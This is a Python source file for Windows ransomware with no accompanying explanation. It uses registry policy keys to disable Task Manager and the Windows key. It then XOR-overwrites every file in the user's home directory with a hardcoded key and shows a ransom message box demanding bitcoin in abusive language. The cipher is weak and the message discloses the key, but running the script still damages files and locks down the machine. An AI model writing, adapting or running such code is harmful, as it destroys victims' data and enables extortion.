import os
import ctypes
import subprocess
import threading
import time
import random
import string
import winreg

def disable_task_manager():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Failed to disable Task Manager: {e}")

def disable_windows_key():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Failed to disable Windows key: {e}")

def encrypt_file(filepath, key):
    try:
        with open(filepath, "rb") as file:
            data = bytearray(file.read())
        for index, byte in enumerate(data):
            data[index] = byte ^ key[index % len(key)]
        with open(filepath, "wb") as file:
            file.write(data)
    except Exception as e:
        print(f"Failed to encrypt {filepath}: {e}")

def encrypt_files(directory, key):
    for root, _, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            if filepath != __file__: # avoid encrypting itself.
                encrypt_file(filepath, key)

def generate_key(key_string):
    key_bytes = []
    for char in key_string:
        key_bytes.append(ord(char))
    return key_bytes

def display_ransom_message():
    message = f"""
    YOUR FILES HAVE BEEN ENCRYPTED.
    PAY UP, SLAVE, OR LOSE EVERYTHING.
    SEND BITCOIN TO [insert bitcoin address here]
    WITH THE CODE: X9D4J-7M2PQ-K8VZB-Y5TWN-C3L6R
    THIS CODE IS ALSO THE KEY TO UNLOCK YOUR FILES.
    Here is the key, visible within this very message: {generate_key("X9D4J-7M2PQ-K8VZB-Y5TWN-C3L6R")}
    """
    ctypes.windll.user32.MessageBoxW(0, message, "RANSOMWARE", 0x10)

def main():

    key_string = "X9D4J-7M2PQ-K8VZB-Y5TWN-C3L6R"
    key = generate_key(key_string)

    disable_task_manager()
    disable_windows_key()

    encrypt_files(os.path.expanduser("~"), key) #encrypts the user's home directory.

    display_ransom_message()

if __name__ == "__main__":
    main()
